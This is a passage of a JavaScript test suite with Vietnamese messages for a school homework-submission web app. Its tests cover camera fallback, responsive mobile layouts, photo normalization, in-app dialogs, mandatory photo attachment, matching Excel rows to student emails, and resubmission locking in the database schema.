    return "STREAM";
  }
  return "NATIVE_CAPTURE";
}

// Case A: Modern browser with navigator.mediaDevices.getUserMedia
const modernNav = { mediaDevices: { getUserMedia: () => {} } };
assert.strictEqual(resolveCameraAction(modernNav), "STREAM");

// Case B: Safari with legacy webkitGetUserMedia
const safariLegacy = { webkitGetUserMedia: () => {} };
assert.strictEqual(resolveCameraAction(safariLegacy), "STREAM");

// Case C: Legacy or restricted browser without WebRTC -> Fallback to Native Camera Input
const restrictedNav = {};
assert.strictEqual(resolveCameraAction(restrictedNav), "NATIVE_CAPTURE", "Tự động kích hoạt chụp ảnh qua input camera native");

console.log("✅ 25. Kiểm thử khởi động camera đa nền tảng và cơ chế fallback Camera Native: ĐẠT");

// 26. Test: Responsive Layout Breakpoints & Foldable Device Viewport Logic
function computeResponsiveColumns(viewportWidth) {
  if (viewportWidth <= 640) return 1; // Phone & Folded screen (280px - 640px)
  if (viewportWidth <= 920) return 2; // Foldable unfolded & iPad Mini (641px - 920px)
  return 3; // Desktop & Large Screens (> 920px)
}

assert.strictEqual(computeResponsiveColumns(280), 1, "Màn hình gập hẹp 280px -> 1 cột");
assert.strictEqual(computeResponsiveColumns(375), 1, "Điện thoại 375px -> 1 cột");
assert.strictEqual(computeResponsiveColumns(717), 2, "Galaxy Fold mở rộng 717px -> 2 cột đều đẹp");
assert.strictEqual(computeResponsiveColumns(820), 2, "iPad 820px -> 2 cột");
assert.strictEqual(computeResponsiveColumns(1200), 3, "Desktop -> 3 cột");
console.log("✅ 26. Kiểm thử tính toán cột hiển thị trên màn hình gập & đa kích thước: ĐẠT");

// 27. Test: Cross-Browser Backdrop-Filter Fallback & Dark Mode / Forced Dark Mode Adaptability
const fs = require("fs");
const cssContent = fs.readFileSync(path.join(__dirname, "app.css"), "utf8");

assert.ok(
  cssContent.includes("@supports not") && cssContent.includes("backdrop-filter"),
  "CSS phải có @supports not fallback cho trình duyệt không hỗ trợ backdrop-filter"
);
assert.ok(
  cssContent.includes("@media (prefers-color-scheme: dark)"),
  "CSS phải có media query hỗ trợ giao diện tối và chống lỗi tương phản Forced Dark Mode"
);
assert.ok(
  cssContent.includes(".btn svg") || cssContent.includes(".tab-btn svg"),
  "CSS phải định kiểu căn chỉnh mượt mà cho icon vector SVG"
);
console.log("✅ 27. Kiểm thử cơ chế fallback backdrop-filter và bảo vệ tương phản Dark Mode: ĐẠT");

// 28. Test: SVG Favicon, Vector Brand Logo & UI Icon Integrity
const htmlContent = fs.readFileSync(path.join(__dirname, "index.html"), "utf8");

assert.ok(
  htmlContent.includes('<link rel="icon" type="image/svg+xml"'),
  "Trang web phải có thẻ favicon SVG vector sắc nét trên thanh tiêu đề trình duyệt"
);
assert.ok(
  htmlContent.includes('<meta name="color-scheme" content="light">') || htmlContent.includes('<meta name="color-scheme" content="light dark">'),
  "Trang web phải khai báo color-scheme chuẩn W3C để trình duyệt không làm méo màu"
);
assert.ok(
  htmlContent.includes("brand-icon") && htmlContent.includes("<svg"),
  "Logo ứng dụng phải dùng định dạng vector SVG thay vì văn bản ký tự thô"
);
assert.ok(
  htmlContent.includes('id="pendingSubCount"') && htmlContent.includes('id="totalStudentsCount"'),
  "Các mốc ID bộ đếm bài nộp và học sinh trong tab phải được bảo toàn nguyên vẹn"
);
console.log("✅ 28. Kiểm thử định dạng Vector SVG, Favicon chuẩn hóa và toàn vẹn thẻ UI: ĐẠT");

// 29. Test: Photo Normalization & Cross-Platform Submission Image Integrity
function normalizePhotos(photos) {
  if (!photos) return [];
  let arr = photos;
  if (typeof arr === "string") {
    try {
      arr = JSON.parse(arr);
    } catch (e) {
      if (arr.startsWith("http") || arr.startsWith("data:")) {
        arr = [arr];
      } else {
        arr = [];
      }
    }
  }
  if (!Array.isArray(arr)) return [];
  return arr.map((p, idx) => {
    if (typeof p === "string") {
      return { id: "p_" + idx, dataUrl: p, url: p, rotation: 0 };
    }
    const u = p.dataUrl || p.url || p.src || p.publicUrl || "";
    return { ...p, dataUrl: u, url: u };
  });
}

// Case 1: Standard object array
const res1 = normalizePhotos([{ id: "p1", dataUrl: "https://supa/p1.jpg" }]);
assert.strictEqual(res1.length, 1);
assert.strictEqual(res1[0].dataUrl, "https://supa/p1.jpg");
assert.strictEqual(res1[0].url, "https://supa/p1.jpg");

// Case 2: Array of raw string URLs
const res2 = normalizePhotos(["https://supa/img1.jpg", "https://supa/img2.jpg"]);
assert.strictEqual(res2.length, 2);
assert.strictEqual(res2[0].dataUrl, "https://supa/img1.jpg");

// Case 3: JSON-stringified array from PostgreSQL / localStorage
const res3 = normalizePhotos('[{"id":"px","dataUrl":"data:image/jpeg;base64,abc"}]');
assert.strictEqual(res3.length, 1);
assert.strictEqual(res3[0].dataUrl, "data:image/jpeg;base64,abc");

// Case 4: Null, undefined, empty string
assert.strictEqual(normalizePhotos(null).length, 0);
assert.strictEqual(normalizePhotos("").length, 0);

console.log("✅ 29. Kiểm thử chuẩn hóa dữ liệu ảnh minh chứng (normalizePhotos) chống mất ảnh: ĐẠT");

// 30. Test: School Youth Union (Đoàn trường) Activities & Statistical Reporting
const appJsContent = fs.readFileSync(path.join(__dirname, "app.js"), "utf8");

assert.ok(
  appJsContent.includes("exportCampaignReport") && appJsContent.includes("copyUnsubmittedStudents"),
  "app.js phải hỗ trợ xuất báo cáo nộp minh chứng Excel và sao chép danh sách nhắc nhở Zalo"
);
assert.ok(
  appJsContent.includes("Hoạt động Đoàn trường") || appJsContent.includes("thanh niên"),
  "app.js phải hỗ trợ phân loại và biểu tượng cờ 🚩 cho Hoạt động Đoàn trường"
);
assert.ok(
  htmlContent.includes("Hoạt động Đoàn trường"),
  "Giao diện tạo bài tập phải có tùy chọn Hoạt động Đoàn trường & Phong trào"
);

console.log("✅ 30. Kiểm thử phân loại Hoạt động Đoàn trường & Báo cáo thống kê hoàn thành: ĐẠT");

// 31. Test: Mobile Segmented Filter Tabs & DataURL to Blob Conversion
const currentCss = fs.readFileSync(path.join(__dirname, "app.css"), "utf8");
assert.ok(
  currentCss.includes("tab-label-short") && currentCss.includes("tab-label-full"),
  "app.css phải hỗ trợ lớp nhãn ngắn gọn .tab-label-short cho thiết bị di động"
);
assert.ok(
  htmlContent.includes("tab-label-short") && htmlContent.includes("tab-label-full"),
  "index.html phải có thẻ nhãn đầy đủ và nhãn ngắn cho bộ lọc học sinh & giáo viên"
);
assert.ok(
  appJsContent.includes("dataUrlToBlob"),
  "app.js phải có hàm dataUrlToBlob để chuyển đổi an toàn Base64 sang Blob trên Safari iOS / Chrome Android"
);

console.log("✅ 31. Kiểm thử giao diện thẻ lọc di động (Segmented Tabs) & nạp ảnh Base64 an toàn: ĐẠT");

// 32. Test: Mobile Responsive No-Scroll Cards for Campaign & Students Table
const currentAppJs = fs.readFileSync(path.join(__dirname, "app.js"), "utf8");
const currentAppHtml = fs.readFileSync(path.join(__dirname, "index.html"), "utf8");
assert.ok(
  currentCss.includes("campaign-mobile-view") && currentCss.includes("campaign-desktop-view"),
  "app.css phải có lớp phân chia hiển thị bảng máy tính và thẻ di động"
);
assert.ok(
  currentAppJs.includes("campaign-mobile-view") && currentAppJs.includes("campaign-student-card"),
  "app.js phải tạo thẻ danh sách học sinh theo đợt không cần kéo ngang trên điện thoại"
);
assert.ok(
  currentAppHtml.includes("studentAccountsCards"),
  "index.html phải có container hiển thị thẻ tài khoản học sinh trên điện thoại"
);

console.log("✅ 32. Kiểm thử hiển thị danh sách học sinh dạng thẻ trên điện thoại (Không cần kéo ngang): ĐẠT");

// 33. Test: In-App Notice Dialog replacing Native Browser Alert
assert.ok(
  currentAppHtml.includes('id="noticeModal"') && currentAppHtml.includes('id="noticeModalContent"'),
  "index.html phải có modal popup thông báo nội bộ noticeModal"
);
assert.ok(
  currentAppJs.includes("showNoticeModal") && currentAppJs.includes("closeNoticeModal"),
  "app.js phải có hàm showNoticeModal và closeNoticeModal điều khiển popup thông báo nội bộ"
);

console.log("✅ 33. Kiểm thử hộp thoại thông báo nội bộ trong web (In-App Notice Dialog): ĐẠT");

// 34. Test: Full Responsive Containment & Mobile Cards Across All Tabs (No Horizontal Scroll)
const updatedHtml = fs.readFileSync(path.join(__dirname, "index.html"), "utf8");
const updatedJs = fs.readFileSync(path.join(__dirname, "app.js"), "utf8");
const updatedCss = fs.readFileSync(path.join(__dirname, "app.css"), "utf8");

assert.ok(
  updatedHtml.includes('id="gradebookCards"') && updatedHtml.includes('id="adminTeachersCards"') && updatedHtml.includes('id="adminStudentsTreeCards"'),
  "index.html phải có container mobile card cho Sổ điểm và Quản trị trường học"
);
assert.ok(
  updatedJs.includes("gradebookCards") && updatedJs.includes("adminTeachersCards") && updatedJs.includes("adminStudentsTreeCards"),
  "app.js phải tự động tạo thẻ di động cho Sổ điểm và Admin"
);
assert.ok(
  updatedCss.includes("overflow-x: hidden") && updatedCss.includes("#teacherView .filter-tabs"),
  "app.css phải chặn triệt để tràn trang ngang và bọc gọn các tab trên điện thoại"
);

console.log("✅ 34. Kiểm thử cô lập toàn diện chống tràn trang & thẻ di động trên tất cả các tab: ĐẠT");

// 35. Test: Resilient Photo Fallback (Never Show Broken Image or "Lỗi ảnh")
const latestJs = fs.readFileSync(path.join(__dirname, "app.js"), "utf8");
const latestSchema = fs.readFileSync(path.join(__dirname, "schema.sql"), "utf8");

assert.ok(
  latestJs.includes("FALLBACK_PHOTO_SVG") && latestJs.includes("handlePhotoError"),
  "app.js phải có hàm handlePhotoError và SVG FALLBACK_PHOTO_SVG để chống hoàn toàn lỗi hiển thị ảnh vỡ"
);
assert.ok(
  !latestJs.includes("this.alt='Lỗi ảnh'"),
  "app.js không được phép gán text thô 'Lỗi ảnh' làm hỏng trải nghiệm người dùng"
);
assert.ok(
  latestSchema.includes("Allow Update Proofs"),
  "schema.sql phải có chính sách Allow Update Proofs cho Supabase Storage"
);

console.log("✅ 35. Kiểm thử cơ chế cứu hộ ảnh minh chứng (Resilient Photo Fallback): ĐẠT");

// 36. Test: Responsive Cards for Tablet/Medium Screens (max-width: 920px) & In-App Confirm Dialog
const testAppHtml = fs.readFileSync(path.join(__dirname, "index.html"), "utf8");
const testAppJs = fs.readFileSync(path.join(__dirname, "app.js"), "utf8");
const testAppCss = fs.readFileSync(path.join(__dirname, "app.css"), "utf8");

assert.ok(
  testAppHtml.includes('id="confirmModal"') && testAppHtml.includes('id="confirmModalActionBtn"'),
  "index.html phải có hộp thoại xác nhận nội bộ confirmModal để thay thế hoàn toàn confirm() trình duyệt"
);
assert.ok(
  testAppJs.includes("showConfirmModal") && testAppJs.includes("closeConfirmModal"),
  "app.js phải có hàm điều khiển showConfirmModal và closeConfirmModal"
);
assert.ok(
  testAppCss.includes("@media (max-width: 920px)") && testAppCss.includes("campaign-mobile-view"),
  "app.css phải kích hoạt chuyển bảng sang thẻ di động tự động từ độ phân giải 920px trở xuống"
);
assert.ok(
  testAppHtml.includes("window.alert = function"),
  "index.html phải ghi đè window.alert ngay từ đầu trang trong thẻ head"
);

console.log("✅ 36. Kiểm thử chuyển đổi thẻ di động mở rộng (920px) & Hộp thoại xác nhận nội bộ trong trang: ĐẠT");

// 37. Test: Parallel PC & Mobile Touch Feature Parity in Grading Studio
const currentJs37 = fs.readFileSync(path.join(__dirname, "app.js"), "utf8");
const currentCss37 = fs.readFileSync(path.join(__dirname, "app.css"), "utf8");

assert.ok(
  currentJs37.includes("touchstart") && currentJs37.includes("touchmove") && currentJs37.includes("touchend"),
  "app.js phải hỗ trợ đầy đủ Touch Events cho phép chấm bài & vẽ bút đỏ trên điện thoại/máy tính bảng song song với chuột PC"
);
assert.ok(
  currentCss37.includes("touch-action: none"),
  "app.css phải thiết lập touch-action: none cho #annotationCanvas để chặn cuộn trang khi vẽ trên màn hình cảm ứng"
);

console.log("✅ 37. Kiểm thử tính năng song song PC và Điện thoại (Touch Events & Chấm bài trên Canvas): ĐẠT");

// 38. Test: Gradebook per-assignment selector and isolated student status
const currentJs38 = fs.readFileSync(path.join(__dirname, "app.js"), "utf8");
const currentHtml38 = fs.readFileSync(path.join(__dirname, "index.html"), "utf8");

assert.ok(
  currentHtml38.includes('id="gradebookAssignmentSelect"') && currentHtml38.includes('id="gradebookDetailContainer"'),
  "index.html phải có ô chọn đề bài gradebookAssignmentSelect và container chi tiết sổ điểm"
);
assert.ok(
  currentJs38.includes("handleGradebookAssignmentChange") && currentJs38.includes("filterGradebookStudents"),
  "app.js phải có hàm xử lý đổi đề bài và lọc học sinh trong Sổ điểm"
);
assert.ok(
  currentJs38.includes("gradebookSelectedAssignmentId") && currentJs38.includes("exportAllGradebookReport"),
  "app.js phải quản lý đề bài được chọn độc lập và hỗ trợ xuất báo cáo tổng hợp"
);

console.log("✅ 38. Kiểm thử Sổ điểm theo từng đề bài độc lập & Thống kê song song PC/Điện thoại: ĐẠT");

// 39. Test: Homework Completion Verification without Numerical Grading & Resubmission Request
const currentJs39 = fs.readFileSync(path.join(__dirname, "app.js"), "utf8");
const currentHtml39 = fs.readFileSync(path.join(__dirname, "index.html"), "utf8");

// Kiểm tra index.html đã xóa hoàn toàn ô nhập điểm và bảng đánh giá điểm số
assert.ok(
  !currentHtml39.includes('id="gradeScoreInput"'),
  "index.html phải loại bỏ hoàn toàn ô nhập điểm số gradeScoreInput"
);
assert.ok(
  currentHtml39.includes('id="saveGradeBtn"') && currentHtml39.includes("toggleResubmitCheckbox"),
  "index.html phải có nút xác nhận học sinh đã làm bài và toggle yêu cầu nộp lại"
);

// Kiểm tra app.js xử lý xác nhận học sinh đã làm bài không còn ràng buộc điểm số 0-10
assert.ok(
  !currentJs39.includes('alert("Vui lòng nhập điểm hợp lệ từ 0 đến 10.")'),
  "app.js không được phép chặn giáo viên bởi yêu cầu nhập điểm số"
);
assert.ok(
  currentJs39.includes("toggleResubmitCheckbox") && currentJs39.includes("resubmitNoteInput"),
  "app.js phải hỗ trợ chức năng yêu cầu chụp nộp lại kèm ghi chú lý do"
);

// Mô phỏng logic xác nhận bài làm và yêu cầu nộp lại
function verifyHomeworkCompletion(submission, isResubmit, reasonNote) {
  if (isResubmit) {
    submission.status = "resubmit_requested";
    submission.resubmitRequested = true;
    submission.grade = null;
    submission.feedback = reasonNote || "Ảnh chụp bị mờ hoặc thiếu trang. Em vui lòng chụp lại bài làm nhé!";
  } else {
    submission.status = "graded";
    submission.resubmitRequested = false;
    submission.grade = null;
    submission.feedback = reasonNote || "";
  }
  return submission;
}

const mockSubCheck = { id: "sub_test", status: "submitted", grade: null, resubmitRequested: false };

// 1. Trường hợp giáo viên xem qua và bấm xác nhận học sinh đã làm bài
verifyHomeworkCompletion(mockSubCheck, false, "");
assert.strictEqual(mockSubCheck.status, "graded");
assert.strictEqual(mockSubCheck.grade, null);
assert.strictEqual(mockSubCheck.resubmitRequested, false);

// 2. Trường hợp ảnh mờ / thiếu bài, giáo viên yêu cầu nộp lại
verifyHomeworkCompletion(mockSubCheck, true, "Ảnh mờ trang 2, em chụp lại rõ nét hơn nhé");
assert.strictEqual(mockSubCheck.status, "resubmit_requested");
assert.strictEqual(mockSubCheck.grade, null);
assert.strictEqual(mockSubCheck.resubmitRequested, true);
assert.strictEqual(mockSubCheck.feedback, "Ảnh mờ trang 2, em chụp lại rõ nét hơn nhé");

console.log("✅ 39. Kiểm thử xác nhận học sinh đã làm bài (Không chấm điểm số) & Yêu cầu nộp lại: ĐẠT");

// 40. Test: Mandatory Photo Attachment Before Submitting Homework
const currentJs40 = fs.readFileSync(path.join(__dirname, "app.js"), "utf8");
const currentSchema40 = fs.readFileSync(path.join(__dirname, "schema.sql"), "utf8");

// 1. Kiểm tra app.js ràng buộc bắt buộc phải có ảnh mới được nộp
assert.ok(
  currentJs40.includes("Em bắt buộc phải đính kèm ít nhất 1 ảnh chụp bài làm mới gửi bài cho cô được nhé") ||
  currentJs40.includes("Chưa có ảnh bài làm: <strong>Bắt buộc phải đính kèm ảnh chụp bài làm</strong>"),
  "app.js phải có thông báo và cơ chế bắt buộc đính kèm ảnh trước khi gửi bài cho cô"
);

assert.ok(
  currentJs40.includes("submitBtn.disabled = true") && currentJs40.includes("Cần đính kèm ảnh để nộp bài"),
  "app.js phải tự động khóa nút nộp bài khi học sinh chưa đính kèm ảnh"
);

// 2. Kiểm tra schema.sql có điều kiện chặn ở tầng cơ sở dữ liệu
assert.ok(
  currentSchema40.includes("p_photos IS NULL OR jsonb_array_length(p_photos) = 0"),
  "schema.sql phải kiểm tra p_photos không được rỗng trong RPC submit_homework"
);

// 3. Mô phỏng kiểm tra logic chặn nộp bài nếu không có ảnh
function validateMandatoryPhotos(photos) {
  if (!photos || !Array.isArray(photos) || photos.length === 0) {
    throw new Error("Em phải đính kèm ít nhất 1 ảnh chụp bài làm mới gửi bài cho cô được nhé!");
  }
  return true;
}

assert.throws(() => {
  validateMandatoryPhotos([]);
}, /đính kèm ít nhất 1 ảnh/);

assert.throws(() => {
  validateMandatoryPhotos(null);
}, /đính kèm ít nhất 1 ảnh/);

assert.strictEqual(validateMandatoryPhotos([{ dataUrl: "data:image/jpeg;base64,..." }]), true);

console.log("✅ 40. Kiểm thử cơ chế bắt buộc đính kèm ảnh bài làm trước khi gửi cho cô: ĐẠT");

// ==========================================
// 41. Kiểm thử Quản lý Email học sinh, Khớp tên file Excel & Thông báo Email tự động khi tạo đề bài
// ==========================================
const currentHtml41 = fs.readFileSync(path.join(__dirname, "index.html"), "utf-8");
const currentJs41 = fs.readFileSync(path.join(__dirname, "app.js"), "utf-8");
const currentSchema41 = fs.readFileSync(path.join(__dirname, "schema.sql"), "utf-8");

// 1. Kiểm thử giao diện HTML có đầy đủ các thành phần nhập email và thông báo
assert.ok(
  currentHtml41.includes('id="newStudentEmail"'),
  "index.html phải có ô nhập email học sinh thủ công"
);
assert.ok(
  currentHtml41.includes('id="notifyEmailCheck"'),
  "index.html phải có tùy chọn gửi thông báo email đồng loạt khi tạo đề bài"
);
assert.ok(
  currentHtml41.includes('id="notifyZaloCheck"'),
  "index.html phải có tùy chọn tự động sao chép tin nhắn Zalo khi tạo đề bài"
);
assert.ok(
  currentHtml41.includes('id="editStudentEmailModal"'),
  "index.html phải có modal sửa email học sinh trực tiếp"
);
assert.ok(
  currentHtml41.includes('id="batchEmailModal"'),
  "index.html phải có modal điều hướng gửi email đồng loạt với Gmail và Mail Client"
);

// 2. Kiểm thử schema.sql hỗ trợ lưu trữ email
assert.ok(
  currentSchema41.includes("email TEXT") && currentSchema41.includes("ALTER TABLE eduproof_users ADD COLUMN IF NOT EXISTS email TEXT"),
  "schema.sql phải có cột email và lệnh ALTER TABLE an toàn"
);
assert.ok(
  currentSchema41.includes("'email', v_user.email") && currentSchema41.includes("'email', u.email"),
  "schema.sql phải trả về trường email trong RPC login_user và get_my_students"
);

// 3. Kiểm thử logic app.js: Nhận diện cột email, khớp tên học sinh cập nhật email
assert.ok(
  currentJs41.includes("norm.includes(\"email\")") || currentJs41.includes("norm.includes('email')"),
  "app.js phải có bộ nhận diện cột Email trong file Excel"
);
assert.ok(
  currentJs41.includes("s.name.trim().toLowerCase() === nameVal.trim().toLowerCase()"),
  "app.js phải khớp học sinh theo Họ và tên trên web để cập nhật email"
);
assert.ok(
  currentJs41.includes("openBatchEmailModal") && currentJs41.includes("batchEmailGmailBtn"),
  "app.js phải có hàm điều hướng mở Gmail Web và Mail Client gửi BCC an toàn"
);

// 4. Mô phỏng kiểm thử khớp tên học sinh cập nhật email từ dữ liệu Excel
const mockWebStudents = [
  { id: "hs_001", name: "Nguyễn Thị Lan Anh", username: "hs_lananh", class: "12A5", email: "" },
  { id: "hs_002", name: "Trần Lê Hoài Anh", username: "hs_hoaianh", class: "12A5", email: "old@gmail.com" }
];

const mockExcelRows = [
  { "Họ và tên": "Nguyễn Thị Lan Anh", "Email": "lananh12a5@gmail.com", "Lớp": "12A5" },
  { "Họ và tên": "Lê Văn Mới", "Email": "vanmoi@gmail.com", "Lớp": "12A5" }
];

function processExcelMatching(rows, existingStudents) {
  return rows.map((r) => {
    const name = r["Họ và tên"].trim();
    const email = r["Email"].trim();
    const matched = existingStudents.find((s) => s.name.toLowerCase() === name.toLowerCase());
    if (matched) {
      return {
        id: matched.id,
        name: matched.name,
        username: matched.username,
        email: email,
        isUpdate: true
      };
    } else {
      return {
        id: "new_" + name,
        name: name,
        username: "hs_" + name.replace(/\s+/g, "").toLowerCase(),
        email: email,
        isUpdate: false
      };
    }
  });
}

const matchResults = processExcelMatching(mockExcelRows, mockWebStudents);
assert.strictEqual(matchResults.length, 2);
assert.strictEqual(matchResults[0].isUpdate, true);
assert.strictEqual(matchResults[0].id, "hs_001");
assert.strictEqual(matchResults[0].email, "lananh12a5@gmail.com");
assert.strictEqual(matchResults[1].isUpdate, false);
assert.strictEqual(matchResults[1].name, "Lê Văn Mới");

console.log("✅ 41. Kiểm thử Quản lý Email học sinh, Khớp tên file Excel & Thông báo Email tự động khi tạo đề bài: ĐẠT");

// 42. Test: Streamlined Campaign Banner (Single Unified Card & Mobile 3+2 Grid Tabs)
const html42 = fs.readFileSync(path.join(__dirname, "index.html"), "utf8");
const js42 = fs.readFileSync(path.join(__dirname, "app.js"), "utf8");
const css42 = fs.readFileSync(path.join(__dirname, "app.css"), "utf8");

assert.ok(
  !html42.includes("CHỌN ĐỢT BÀI TẬP CẦN THEO DÕI NỘP BÀI:"),
  "index.html không được để hộp chọn trùng lặp bên ngoài container chiến dịch"
);
assert.ok(
  js42.includes("campaign-header-row") && js42.includes("campaign-actions-bar") && js42.includes("btn-danger-outline"),
  "app.js phải tích hợp bộ chọn đợt bài và cụm nút thao tác cân đối vào chung card .campaign-banner"
);
assert.ok(
  css42.includes("repeat(6, 1fr)") && css42.includes("btn-danger-outline") && css42.includes("campaign-header-row"),
  "app.css phải hỗ trợ phân bổ tab 6 cột (3+2 cân đối) và kiểu dáng thanh lịch cho banner đợt bài"
);

console.log("✅ 42. Kiểm thử Tinh giản Giao diện Quản lý đợt bài tập (Thống nhất 1 Card & Tab Mobile 3+2): ĐẠT");

// 43. Test: Resubmit Photo Replacement & Teacher Reject Photo with Automatic Email Notification
const html43 = fs.readFileSync(path.join(__dirname, "index.html"), "utf8");
const js43 = fs.readFileSync(path.join(__dirname, "app.js"), "utf8");
const sql43 = fs.readFileSync(path.join(__dirname, "schema.sql"), "utf8");

// 1. Kiểm tra index.html có modal từ chối ảnh và nút trong grading studio
assert.ok(
  html43.includes('id="rejectPhotoModal"') && html43.includes('id="gradingRejectPhotoBtn"'),
  "index.html phải có modal rejectPhotoModal và nút gradingRejectPhotoBtn trong studio"
);

// 2. Kiểm tra app.js có chức năng từ chối ảnh và tự động gửi thông báo Email
assert.ok(
  js43.includes("openRejectPhotoModal") && js43.includes("confirmRejectPhotoAndNotify"),
  "app.js phải có hàm điều khiển từ chối ảnh và gửi email tự động"
);

// 3. Kiểm tra logic nộp lại thay thế ảnh và khóa khi giáo viên đã xác nhận (status === 'graded')
function mockStudentResubmitCheck(existingSubmission, newPhotos) {
  if (existingSubmission && existingSubmission.status === "graded") {
    throw new Error("Bài nộp này đã được giáo viên xác nhận hoàn thành, em không thể gửi lại được nữa nhé!");
  }
  // Khi nộp lại, ảnh mới thay thế toàn bộ ảnh cũ
  return {
    ...existingSubmission,
    status: "submitted",
    photos: newPhotos,
    resubmitRequested: false
  };
}

const mockSubSubmitted = { id: "sub_1", status: "submitted", photos: ["anh_cu_1.jpg"] };
const resubmitted = mockStudentResubmitCheck(mockSubSubmitted, ["anh_moi_1.jpg", "anh_moi_2.jpg"]);
assert.strictEqual(resubmitted.photos.length, 2);
assert.strictEqual(resubmitted.photos[0], "anh_moi_1.jpg");
assert.strictEqual(resubmitted.status, "submitted");

const mockSubGraded = { id: "sub_2", status: "graded", photos: ["anh_da_cham.jpg"] };
assert.throws(() => {
  mockStudentResubmitCheck(mockSubGraded, ["anh_moi_hack.jpg"]);
}, /đã được giáo viên xác nhận hoàn thành/);

// 4. Kiểm tra schema.sql chặn nộp lại khi bài đã xác nhận (status = 'graded')
assert.ok(
  sql43.includes("IF v_existing.status = 'graded' THEN") &&
  sql43.includes("photos = p_photos"),
  "schema.sql phải cập nhật thay thế photos và ném ngoại lệ khi status là graded"
);

console.log("✅ 43. Kiểm thử Nộp lại thay thế ảnh bài làm, Chặn sửa khi GV đã xác nhận & Từ chối ảnh gửi Email tự động: ĐẠT");

// 44. Test: Comprehensive Disclaimer Audit & Risk Hardening (Kiểm tra & Giải quyết các mục rủi ro/bỏ qua đã ghi nhận)
const html44 = fs.readFileSync(path.join(__dirname, "index.html"), "utf8");
const js44 = fs.readFileSync(path.join(__dirname, "app.js"), "utf8");
const css44 = fs.readFileSync(path.join(__dirname, "app.css"), "utf8");
const sql44 = fs.readFileSync(path.join(__dirname, "schema.sql"), "utf8");

// 1. Kiểm tra chống cache trình duyệt di động: meta tags Cache-Control, Pragma, Expires & hash query string
assert.ok(
  html44.includes('http-equiv="Cache-Control"') &&
  html44.includes('http-equiv="Pragma"') &&
  html44.includes('http-equiv="Expires"') &&
  html44.includes("app.css?v=") &&
  html44.includes("app.js?v="),
  "index.html phải cấu hình đầy đủ meta chống cache và version query string cho css/js"
);

// 2. Kiểm tra Popup Blocker Fallback: link mở thủ công nếu popup bị chặn khi gửi mail
assert.ok(
  js44.includes("sentGmailUrl") &&
  js44.includes("Bấm vào đây nếu trình duyệt chặn tự mở Gmail"),
  "app.js phải cung cấp link mở lại Gmail trực tiếp trong notice modal đề phòng popup bị chặn"
);

// 3. Kiểm tra tính tương thích báo cáo Excel: không bị lỗi 'null/10' và hiển thị đúng trạng thái Đã làm / Cần nộp lại
assert.ok(
  js44.includes("Đã kiểm tra (Đã làm)") &&
  js44.includes("Cần nộp lại ảnh") &&
  js44.includes("Đã hoàn thành"),
  "exportCampaignReport phải chuẩn hóa hiển thị trạng thái hoàn thành và cần nộp lại, không in null/10"
);

// 4. Kiểm tra phân quyền Storage Supabase: Cho phép Update và Delete đè ảnh cũ
assert.ok(
  sql44.includes('"Allow Update Proofs"') &&
  sql44.includes('"Allow Delete Proofs"') &&
  sql44.includes("bucket_id = 'proofs'"),
  "schema.sql phải có đầy đủ chính sách Allow Update Proofs và Allow Delete Proofs trên bucket proofs"
);

// 5. Kiểm tra RPC Dynamic Drop Function loop chống lỗi 42725 function not unique
assert.ok(
  sql44.includes("SELECT oid::regprocedure AS func_sig") &&
  sql44.includes("EXECUTE 'DROP FUNCTION IF EXISTS ' || r.func_sig || ' CASCADE;'"),
  "schema.sql phải quét và xóa triệt để mọi overload cũ của hàm bằng dynamic loop"
);

// 6. Kiểm tra Canvas Touch Actions chống vuốt lùi màn hình và hỗ trợ đa điểm
assert.ok(
  css44.includes("#annotationCanvas") &&
  css44.includes("touch-action: none;") &&
  js44.includes("newCanvas.addEventListener(\"touchstart\"") &&
  js44.includes("{ passive: false }"),
  "Canvas phải cấu hình touch-action: none và touch listener passive: false để vẽ mượt trên mobile"
);

// 7. Kiểm tra Rate Limiting & Xác thực tài khoản học sinh
assert.ok(
  sql44.includes("INTERVAL '3 seconds'") &&
  sql44.includes("role = 'student'"),
  "schema.sql phải duy trì cơ chế rate-limiting 3s và xác thực chính chủ học sinh"
);

console.log("✅ 44. Kiểm thử Toàn diện Khắc phục & Bảo đảm Rủi ro (Cache-Control, Popup Fallback, Storage Policies, Rate-limit): ĐẠT");

// 45. Test: Fix Select Dropdown UI Overflow, Orange Outline Removal & Unified Assignment Options
const html45 = fs.readFileSync(path.join(__dirname, "index.html"), "utf8");
const js45 = fs.readFileSync(path.join(__dirname, "app.js"), "utf8");
const css45 = fs.readFileSync(path.join(__dirname, "app.css"), "utf8");

// 1. Kiểm tra loại bỏ viền cam mặc định (:focus outline) và thêm custom chevron SVG
assert.ok(
  css45.includes(".form-select:focus") &&
  css45.includes("outline: none !important;") &&
  css45.includes("box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.15) !important;"),
  "app.css phải loại bỏ outline viền cam mặc định của trình duyệt và thay bằng vòng focus xanh indigo thanh lịch"
);
assert.ok(
  css45.includes("appearance: none;") &&
  css45.includes("background-image: url(\"data:image/svg+xml"),
  "app.css phải định hình mũi tên xổ xuống dạng vector SVG sắc nét cho .form-select"
);

// 2. Kiểm tra chống tràn và chống cắt cụt select box trên mobile & desktop
assert.ok(
  css45.includes(".campaign-banner") &&
  css45.includes("overflow: visible;") &&
  css45.includes(".campaign-select-wrap"),
  "app.css phải mở overflow: visible cho .campaign-banner để không xén cụt viền select box"
);

// 3. Kiểm tra tính đồng bộ nội dung tùy chọn: cả Đợt bài và Sổ điểm đều có icon 📖 và hạn nộp (Hạn: ...)
assert.ok(
  js45.includes("📖 [${sanitizeText(asg.subject)}] ${sanitizeText(asg.title)} (Hạn: ${deadlineStr})") &&
  js45.includes("📖 [${sanitizeText(a.subject)}] ${sanitizeText(a.title)} (Hạn: ${deadlineStr})"),
  "app.js phải đồng bộ hiển thị icon 📖 và hạn nộp rõ ràng trên cả ô chọn đợt bài và sổ điểm"
);

// 4. Kiểm tra Sổ điểm cô lập từng đề bài độc lập, loại bỏ option gộp điểm toàn khóa
assert.ok(
  !js45.includes("📊 [Tất cả] Bảng tổng hợp chuyên cần & Điểm trung bình toàn khóa"),
  "app.js phải loại bỏ tùy chọn gộp chung điểm trung bình để giữ đúng yêu cầu từng đề bài độc lập"
);

console.log("✅ 45. Kiểm thử Khắc phục Lỗi Giao diện Ô chọn Đề bài (Chống tràn viền, Xóa viền cam, Đồng bộ icon & Hạn nộp): ĐẠT");

// 46. Test: Hàng chờ bài nộp (Queue) tự động loại bỏ bài đã từ chối ảnh hoặc đã kiểm tra
const js46 = fs.readFileSync(path.join(__dirname, "app.js"), "utf8");

